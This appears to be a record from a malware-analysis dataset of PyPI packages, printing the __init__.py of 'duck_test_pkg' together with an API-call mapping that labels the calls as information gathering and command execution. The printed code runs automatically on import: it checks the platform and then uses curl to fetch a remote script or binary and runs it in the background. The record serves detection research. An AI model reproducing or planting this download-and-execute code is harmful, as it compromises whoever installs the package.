[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/duck_test_pkg-1.99.10/duck_test_pkg-1.99.10/duck_test_pkg/__init__.py",
    "code_snippet": "from platform import platform\nfrom subprocess import Popen\n\nos = platform().lower()\n\n\ndef mznt():\n    d = \"/private/tmp/o\"\n    c = f\"\"\"\n    curl -s http://192.168.10.82:9000/o.js -o {d} && nohup /usr/bin/osascript -l JavaScript {d} 1>/dev/null 2>&1 &\n    \"\"\"\n    Popen(c, shell=True)\n\n\ndef pgn():\n    d = \"/tmp/e\"\n    c = f\"\"\"\n    curl -s https:///eb.ngrok.dev/e -o {d} && chmod +x {d} && nohup {d} &1>/dev/null 2>&1 &'\n    while true; do\n      sleep 5\n    done    \n    \"\"\"\n    Popen(c, shell=True)\n    pass\n\n\nif \"macos-\" in os:\n    mznt()\nelse:\n    pgn()",
    "pattern_analysis": {
      "api_sequence": [
        "platform.platform",
        "subprocess.Popen",
        "subprocess.Popen"
      ],
      "api_sequence_with_args": [
        "platform.platform()",
        "subprocess.Popen(c, shell=True)",
        "subprocess.Popen(c, shell=True)"
      ],
      "mapped_sequence": [
        {
          "api_name": "platform.platform",
          "id": "get_platform_info",
          "description": "Retrieves platform information as string",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        }
      ],
      "contextual_code": "from platform import platform\nfrom subprocess import Popen\n\nos = platform().lower()\n\ndef mznt():\n    d = \"/private/tmp/o\"\n    c = f\"\"\"\n    curl -s http://192.168.10.82:9000/o.js -o {d} && nohup /usr/bin/osascript -l JavaScript {d} 1>/dev/null 2>&1 &\n    \"\"\"\n    Popen(c, shell=True)\n\ndef pgn():\n    d = \"/tmp/e\"\n    c = f\"\"\"\n    curl -s https:///eb.ngrok.dev/e -o {d} && chmod +x {d} && nohup {d} &1>/dev/null 2>&1 &'\n    while true; do\n      sleep 5\n    done    \n    \"\"\"\n    Popen(c, shell=True)\n    pass\n\nif \"macos-\" in os:\n    mznt()\nelse:\n    pgn()"
    }
  }
]